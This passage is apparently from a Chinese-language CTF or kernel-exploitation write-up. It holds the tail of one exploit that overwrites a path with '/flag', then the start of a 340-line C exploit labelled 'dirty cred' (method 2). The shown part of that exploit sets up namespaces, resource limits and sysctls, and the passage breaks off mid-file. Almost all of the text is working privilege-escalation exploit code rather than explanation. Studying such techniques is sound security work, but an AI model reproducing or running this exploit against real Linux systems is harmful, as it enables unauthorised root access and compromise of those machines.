</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="s">&#34;/flag</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span><span class="mi">14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="方法2-1">方法2</h5>
<p>dirty cred</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -static -pthread ./exploit -o ./exploit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;endian.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mount.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/time.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/uio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kcmp.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/capability.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">va_list</span> <span class="n">params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">va_start</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vfprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">va_end</span><span class="p">(</span><span class="n">params</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// use_temporary_dir() —— setup working dir, create writable file &#34;./exp_dir/data&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">use_temporary_dir</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">chdir</span><span class="p">(</span><span class="s">&#34;/tmp&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">tmpdir</span> <span class="o">=</span> <span class="s">&#34;exp_dir&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tmpdir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chmod</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chdir</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">))</span>  <span class="c1">// set current work dir
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// write_file() —— write sysctl file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">bool</span> <span class="nf">write_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">va_list</span> <span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vsnprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">what</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">errno</span> <span class="o">=</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">setup_common</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">mount</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;/sys/fs/fuse/connections&#34;</span><span class="p">,</span> <span class="s">&#34;fusectl&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">loop</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// sandbox_common() —— setup sub-process parameter (memory / namespace / msg)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">sandbox_common</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setsid</span><span class="p">();</span>   <span class="c1">// 调用 setsid() 后 namespace_sandbox_proc() 子进程不受终端影响，终端退出，不影响子进程继续运行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span><span class="p">;</span>   <span class="c1">// setrlimit() - https://blog.csdn.net/sinat_38816924/article/details/122241661
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="p">(</span><span class="mi">200</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_AS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>              <span class="c1">// 进程的虚拟内存(地址空间)的最大大小
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>         <span class="c1">// 锁定到RAM中的最大内存字节数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">136</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_FSIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>           <span class="c1">// 该进程可能创建的文件的最大大小(以字节为单位)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>           <span class="c1">// 最大的进程堆栈，以字节为单位
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_CORE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>            <span class="c1">// 内核转存文件的最大长度
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>          <span class="c1">// 指定比进程可打开的最大文件描述符数量，超出此值，将会产生EMFILE错误
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNS</span><span class="p">))</span> <span class="p">{</span>         <span class="c1">// unshare() - https://man7.org/linux/man-pages/man2/unshare.2.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>                                   <span class="c1">// CLONE_NEWNS - the calling process has a private copy of its namespace which is not shared with any other process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">mount</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MS_REC</span> <span class="o">|</span> <span class="n">MS_PRIVATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWIPC</span><span class="p">))</span> <span class="p">{</span>        <span class="c1">// CLONE_NEWIPC - the calling process has a private copy of the IPC namespace which is not shared with any other process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="mh">0x02000000</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWUTS</span><span class="p">))</span> <span class="p">{</span>        <span class="c1">// CLONE_NEWUTS - the calling process has a private copy of the UTS namespace which is not shared with any other process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_SYSVSEM</span><span class="p">))</span> <span class="p">{</span>       <span class="c1">// CLONE_SYSVSEM - the calling process has a new empty semadj list that is not shared with any other process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="kt">sysctl_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">static</span> <span class="k">const</span> <span class="kt">sysctl_t</span> <span class="n">sysctls</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmmax&#34;</span><span class="p">,</span> <span class="s">&#34;16777216&#34;</span><span class="p">},</span>    <span class="c1">// 定义单个共享内存段的最大值 https://blog.csdn.net/shmily_lsl/article/details/103384366
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmall&#34;</span><span class="p">,</span> <span class="s">&#34;536870912&#34;</span><span class="p">},</span>   <span class="c1">// 控制可以使用的共享内存的总页数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmmni&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 设置系统范围内共享内存段的最大数量。该参数的默认值是 4096
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmax&#34;</span><span class="p">,</span> <span class="s">&#34;8192&#34;</span><span class="p">},</span>        <span class="c1">// 一个消息的字节大小
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmni&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 系统范围内的消息队列上限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmnb&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 一个消息队列的容量，最大字节数
